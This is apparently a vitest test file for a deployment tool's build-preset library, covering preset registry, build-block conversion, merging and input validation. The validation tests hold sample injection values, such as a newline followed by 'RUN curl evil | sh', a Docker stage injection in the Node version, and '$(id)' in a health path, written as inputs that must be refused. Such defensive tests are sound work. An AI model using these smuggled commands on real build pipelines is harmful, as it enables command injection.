import { describe, expect, it } from "vitest";
import type { BuildConfig } from "@/lib/agent-types";
import {
  PRESET_IDS,
  PRESET_LIST,
  getPreset,
  describeBuild,
  hasBuildStage,
  isPresetId,
  mergeBuild,
  optionsFromBuild,
  presetOf,
  toBuildBlock,
  validatePresetHealthPath,
  validatePresetOptions,
  validatePresetPort,
  visibleFields,
  type PresetField,
  type PresetId,
  type PresetOptions,
} from "@/lib/presets-core";

describe("the registry", () => {
  it("lists the five cards in order, each complete", () => {
    expect(PRESET_IDS).toEqual(["nextjs", "node", "vite", "static", "dockerfile"]);
    expect(PRESET_LIST.map((p) => p.id)).toEqual([...PRESET_IDS]);
    for (const p of PRESET_LIST) {
      expect(p.label.length).toBeGreaterThan(0);
      expect(p.description.length).toBeGreaterThan(10);
      expect(p.icon).toMatch(/^[A-Z][A-Za-z]+$/);
      expect(p.fields).toContain("context");
      expect(getPreset(p.id)).toBe(p);
    }
  });

  it("knows the default port and health path of each", () => {
    expect(PRESET_LIST.map((p) => [p.id, p.defaultPort, p.defaultHealthPath])).toEqual([
      ["nextjs", 3000, "/"],
      ["node", 3000, "/"],
      ["vite", 8080, "/"],
      ["static", 8080, "/"],
      ["dockerfile", null, ""],
    ]);
  });

  it("shows each preset only the options it reads, as the agent does", () => {
    expect(getPreset("nextjs").fields).toEqual(["context", "install", "build_command", "start", "node", "standalone"]);
    expect(getPreset("node").fields).toEqual(["context", "install", "build_command", "start", "node"]);
    expect(getPreset("vite").fields).toEqual(["context", "install", "build_command", "output_dir", "node", "spa"]);
    expect(getPreset("dockerfile").fields).toEqual(["context", "dockerfile", "target"]);
  });

  it("recognizes a preset id and the card of an existing build block", () => {
    expect(isPresetId("vite")).toBe(true);
    expect(isPresetId("rails")).toBe(false);
    expect(isPresetId(undefined)).toBe(false);
    expect(presetOf({ preset: "static" })).toBe("static");
    expect(presetOf({ dockerfile: "Dockerfile" })).toBe("dockerfile");
    expect(presetOf(undefined)).toBe("dockerfile");
  });

  it("hides the install command and Node.js version of a static site that is not built", () => {
    expect(visibleFields("static", {})).toEqual(["context", "build_command", "output_dir", "spa"]);
    expect(visibleFields("static", { build_command: "  " })).not.toContain("install");
    expect(visibleFields("static", { build_command: "make" })).toContain("install");
    expect(visibleFields("static", { build_command: "make" })).toContain("node");
    expect(hasBuildStage("static", {})).toBe(false);
    expect(hasBuildStage("static", { build_command: "make" })).toBe(true);
    expect(hasBuildStage("vite", {})).toBe(true);
  });
});

describe("toBuildBlock", () => {
  it("writes only the preset when everything is blank", () => {
    expect(toBuildBlock("nextjs", {})).toEqual({ preset: "nextjs" });
    expect(toBuildBlock("node", { install: "", build_command: "  ", start: "" })).toEqual({ preset: "node" });
    expect(toBuildBlock("vite", { context: "." })).toEqual({ preset: "vite" });
  });

  it("writes the options that were set, trimmed and normalized", () => {
    expect(
      toBuildBlock("nextjs", { context: "./apps//web/", install: " pnpm install --ignore-scripts ", build_command: "pnpm run build:prod", start: "node server.js", node: "20", standalone: true }),
    ).toEqual({ preset: "nextjs", context: "apps/web", install: "pnpm install --ignore-scripts", build_command: "pnpm run build:prod", start: "node server.js", node: "20", standalone: true });
    expect(toBuildBlock("vite", { output_dir: "./build//out/", spa: false })).toEqual({ preset: "vite", output_dir: "build/out", spa: false });
  });

  it("leaves the defaults to the agent: spa on, standalone off", () => {
    expect(toBuildBlock("vite", { spa: true })).toEqual({ preset: "vite" });
    expect(toBuildBlock("nextjs", { standalone: false })).toEqual({ preset: "nextjs" });
  });

  it("drops what the preset does not read, so a switch of card leaves nothing behind", () => {
    const leftovers = { install: "npm ci", build_command: "npm run build", start: "node x.js", output_dir: "out", node: "24", spa: false, standalone: true, dockerfile: "Dockerfile", target: "runner" };
    expect(toBuildBlock("node", leftovers)).toEqual({ preset: "node", install: "npm ci", build_command: "npm run build", start: "node x.js", node: "24" });
    expect(toBuildBlock("vite", leftovers)).toEqual({ preset: "vite", install: "npm ci", build_command: "npm run build", output_dir: "out", node: "24", spa: false });
    expect(toBuildBlock("static", leftovers)).toEqual({ preset: "static", build_command: "npm run build", install: "npm ci", output_dir: "out", node: "24", spa: false });
    expect(toBuildBlock("static", { ...leftovers, build_command: "" })).toEqual({ preset: "static", output_dir: "out", spa: false });
  });

  it("never mixes a preset with dockerfile or target, as the agent refuses it", () => {
    for (const id of ["nextjs", "node", "vite", "static"] as const) {
      const block = toBuildBlock(id, { dockerfile: "docker/Prod.Dockerfile", target: "runner" });
      expect(block).not.toHaveProperty("dockerfile");
      expect(block).not.toHaveProperty("target");
    }
  });

  it("builds the repository's own Dockerfile without a preset", () => {
    expect(toBuildBlock("dockerfile", {})).toEqual({});
    expect(toBuildBlock("dockerfile", { dockerfile: "docker/Prod.Dockerfile", context: "services/web", target: "runner", install: "npm ci", node: "20" })).toEqual({
      dockerfile: "docker/Prod.Dockerfile",
      context: "services/web",
      target: "runner",
    });
  });

  it("round-trips an existing build block through the form", () => {
    const blocks: BuildConfig[] = [
      { preset: "nextjs", context: "apps/web", node: "22", standalone: true, args: undefined },
      { preset: "vite", output_dir: "build", spa: false },
      { preset: "node", start: "node dist/main.js" },
      { dockerfile: "Dockerfile.prod", target: "runner", context: "app" },
    ];
    for (const b of blocks) {
      const clean = JSON.parse(JSON.stringify(b)) as BuildConfig;
      expect(toBuildBlock(presetOf(b), optionsFromBuild(b))).toEqual(clean);
    }
    // A YAML `node: 22` reaches the model as a number.
    expect(optionsFromBuild({ preset: "node", node: 22 }).node).toBe("22");
  });
});

describe("validatePresetOptions mirrors the agent", () => {
  const bad: [string, PresetId, PresetOptions, PresetField, RegExp][] = [
    ["a newline in install", "node", { install: "npm ci\nRUN curl evil | sh" }, "install", /One line/],
    ["CRLF in build_command", "nextjs", { build_command: "a\r\nb" }, "build_command", /One line/],
    ["a NUL byte in start", "node", { start: "a\u0000b" }, "start", /One line/],
    ["a line separator in start", "node", { start: "a\u2028b" }, "start", /One line/],
    ["a blank install", "node", { install: "   " }, "install", /Blank/],
    ["a command of 1025 bytes", "node", { build_command: "a".repeat(1025) }, "build_command", /At most 1024/],
    ["a multibyte command over 1024 bytes", "node", { build_command: "é".repeat(600) }, "build_command", /At most 1024/],
    ["Node.js as text", "node", { node: "lts" }, "node", /major version/],
    ["Node.js 16", "node", { node: "16" }, "node", /major version/],
    ["a Node.js minor", "vite", { node: "22.1" }, "node", /major version/],
    ["an injection in node", "node", { node: "22-alpine AS x\nRUN id" }, "node", /major version/],
    ["output_dir up", "vite", { output_dir: "../x" }, "output_dir", /must not leave/],
    ["output_dir absolute", "vite", { output_dir: "/etc" }, "output_dir", /relative path/],
    ["output_dir backslash", "static", { output_dir: "a\\b" }, "output_dir", /relative path/],
    ["output_dir with a wildcard", "vite", { output_dir: "dist/*" }, "output_dir", /Letters, digits/],
    ["output_dir with a space", "vite", { output_dir: "my dist" }, "output_dir", /Letters, digits/],
    ["the whole project as the build output", "vite", { output_dir: "." }, "output_dir", /whole project/],
    ["context up", "node", { context: ".." }, "context", /must not leave/],
    ["context absolute", "node", { context: "/srv" }, "context", /relative path/],
    ["a sneaky context", "nextjs", { context: "a/../../x" }, "context", /must not leave/],
    ["a Dockerfile above the repository", "dockerfile", { dockerfile: "../Dockerfile" }, "dockerfile", /must not leave/],
    ["a Dockerfile that is a directory", "dockerfile", { dockerfile: "." }, "dockerfile", /name a file/],
    ["a bad target", "dockerfile", { target: "-x" }, "target", /stage name/],
  ];
  for (const [name, id, options, field, message] of bad) {
    it(`refuses ${name}`, () => {
      expect(validatePresetOptions(id, options)[field]).toMatch(message);
    });
  }

  it("accepts what the agent accepts", () => {
    expect(validatePresetOptions("nextjs", {})).toEqual({});
    expect(validatePresetOptions("nextjs", { install: "pnpm install --frozen-lockfile", build_command: 'npm run build -- --no-lint', start: 'next start -p "$PORT"', node: "24", context: "apps/web", standalone: true })).toEqual({});
    expect(validatePresetOptions("node", { node: "18", start: "a\tb" })).toEqual({});
    expect(validatePresetOptions("vite", { output_dir: "./build//out/", spa: false })).toEqual({});
    expect(validatePresetOptions("static", { output_dir: "." })).toEqual({});
    expect(validatePresetOptions("static", { output_dir: ".", build_command: "make" })).toHaveProperty("output_dir");
    expect(validatePresetOptions("dockerfile", { dockerfile: "docker/Prod.Dockerfile", context: "services/web", target: "runner" })).toEqual({});
    expect(validatePresetOptions("dockerfile", { context: "" })).toEqual({});
    expect(validatePresetOptions("node", { build_command: "a".repeat(1024) })).toEqual({});
  });

  it("only checks what the preset reads", () => {
    // A stale value of another card is never sent, so it is never an error either.
    expect(validatePresetOptions("node", { output_dir: "../x", node: "22", target: "-x", dockerfile: "/abs" })).toEqual({});
    expect(validatePresetOptions("static", { install: "a\nb", node: "lts" })).toEqual({});
    expect(validatePresetOptions("static", { install: "a\nb", build_command: "make" })).toHaveProperty("install");
    expect(validatePresetOptions("dockerfile", { install: "a\nb", output_dir: "../x" })).toEqual({});
  });
});

describe("the port and the health path of the app", () => {
  it("keeps nginx off the privileged ports", () => {
    expect(validatePresetPort("vite", 80)).toMatch(/below 1024/);
    expect(validatePresetPort("static", 443)).toMatch(/below 1024/);
    expect(validatePresetPort("vite", 1024)).toBeNull();
    expect(validatePresetPort("node", 80)).toBeNull();
    expect(validatePresetPort("dockerfile", 80)).toBeNull();
    expect(validatePresetPort("node", 0)).toMatch(/between 1 and 65535/);
    expect(validatePresetPort("node", 70000)).toMatch(/between 1 and 65535/);
    expect(validatePresetPort("node", 3000.5)).toMatch(/between 1 and 65535/);
  });

  it("accepts the health paths the generated image can carry", () => {
    for (const p of ["", "/", "/healthz", "/api/health?probe=1&x=2", "/a%20b", "/a:b@c+d,e-f_g.h~i"]) {
      expect(validatePresetHealthPath("node", p), p).toBeNull();
    }
    for (const p of ["healthz", "/a b", "/a$(id)", '/a"b', "/a'b", "/a`b", "/a\\b", "/a\nb", "/a;b"]) {
      expect(validatePresetHealthPath("node", p), p).not.toBeNull();
    }
    // A repository's own image is not constrained by the preset's ENV line, only by the agent's basic rule.
    expect(validatePresetHealthPath("dockerfile", "/a;b")).toBeNull();
    expect(validatePresetHealthPath("dockerfile", "/a b")).not.toBeNull();
    expect(validatePresetHealthPath("dockerfile", "x")).not.toBeNull();
  });
});

describe("editing an existing build block", () => {
  const original: BuildConfig = { preset: "nextjs", install: "pnpm i", start: "node server.js", node: 20, standalone: true, memory: "4g", cpus: 3, timeout: "30m", args: { NEXT_PUBLIC_A: "1" }, max_source: "200m", source_hosts: ["github.com"] };

  it("round-trips the preset and its options and keeps everything the form does not show", () => {
    const merged = mergeBuild(original, presetOf(original), optionsFromBuild(original));
    expect(merged).toEqual({ ...original, node: "20" }); // a YAML number comes back as the text the field holds
  });

  it("replaces only what the options own when the framework or an option changes", () => {
    const options = { ...optionsFromBuild(original), install: "", standalone: false };
    expect(mergeBuild(original, "nextjs", options)).toEqual({ preset: "nextjs", start: "node server.js", node: "20", memory: "4g", cpus: 3, timeout: "30m", args: { NEXT_PUBLIC_A: "1" }, max_source: "200m", source_hosts: ["github.com"] });
    // Another framework drops the options it does not read.
    expect(mergeBuild(original, "vite", optionsFromBuild(original))).toEqual({ preset: "vite", install: "pnpm i", node: "20", memory: "4g", cpus: 3, timeout: "30m", args: { NEXT_PUBLIC_A: "1" }, max_source: "200m", source_hosts: ["github.com"] });
  });

  it("goes from a preset to the repository's Dockerfile without a preset left behind", () => {
    const merged = mergeBuild(original, "dockerfile", { dockerfile: "docker/Dockerfile", context: "app" });
    expect(merged.preset).toBeUndefined();
    expect(merged).toMatchObject({ dockerfile: "docker/Dockerfile", context: "app", memory: "4g" });
    expect(merged.install).toBeUndefined();
  });

  it("round-trips a Dockerfile block as it was", () => {
    const dockerfile: BuildConfig = { dockerfile: "Dockerfile", context: "api", target: "prod", memory: "2g", cpus: 2, timeout: "15m" };
    expect(mergeBuild(dockerfile, presetOf(dockerfile), optionsFromBuild(dockerfile))).toEqual(dockerfile);
  });
});

describe("what the app page says about how it is built", () => {
  it("names the preset with the options that were set, and the Dockerfile otherwise", () => {
    expect(describeBuild({ preset: "nextjs", standalone: true, install: "pnpm i", node: "20" })).toEqual({ label: "Next.js preset", details: ["Install: pnpm i", "Node.js: 20", "Standalone output"] });
    expect(describeBuild({ preset: "vite", spa: false })).toEqual({ label: "Vite preset", details: ["Output: dist", "Node.js: 22", "Single-page fallback off"] });
    expect(describeBuild({ preset: "static" })).toEqual({ label: "Static files preset", details: ["Output: dist"] });
    expect(describeBuild({ dockerfile: "docker/Dockerfile", context: "app", target: "prod" })).toEqual({ label: "Repository Dockerfile", details: ["Directory: app", "Dockerfile: docker/Dockerfile", "Stage: prod"] });
    expect(describeBuild(undefined)).toBeNull();
  });
});
